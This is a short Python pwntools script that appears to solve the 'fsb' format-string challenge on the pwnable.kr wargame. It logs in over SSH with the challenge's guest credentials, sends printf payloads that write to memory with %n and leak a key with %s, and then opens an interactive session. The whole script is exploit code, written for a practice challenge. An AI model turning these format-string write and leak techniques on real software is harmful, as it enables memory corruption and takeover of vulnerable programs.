from pwn import *

s = ssh(host='pwnable.kr', port=2222, user='fsb',password='guest')

p = s.process('./fsb')

print(p.recvline())

p.sendline('%134520928x%14$n')
print(p.recvline())
print(p.recvline())

p.sendline('                ')
print(p.recvline())

p.sendline('%20$s')
s= p.recvline()
key = struct.unpack('Q', s[:-1])[0]
print(key)

p.sendline('                ')
p.interactive()
